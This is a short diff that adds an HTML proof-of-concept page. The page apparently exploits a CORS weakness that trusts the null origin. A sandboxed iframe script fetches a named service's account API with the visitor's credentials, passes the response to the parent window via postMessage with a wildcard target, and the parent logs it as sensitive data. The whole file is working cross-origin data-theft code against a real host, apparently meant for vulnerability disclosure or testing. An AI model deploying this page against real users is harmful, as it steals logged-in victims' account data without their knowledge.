@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe srcdoc="
+      <script>
+        fetch('https://login.devolutions.com/api/v1/account', {
+          credentials: 'include'
+        })
+        .then(r => r.text())
+        .then(d => parent.postMessage(d, '*'));
+      </script>
+    " sandbox="allow-scripts"></iframe>
+
+    <script>
+      window.addEventListener('message', (e) => {
+        console.log('Sensitive data from null-origin iframe:', e.data);
+      });
+    </script>
+  </body>
+</html>
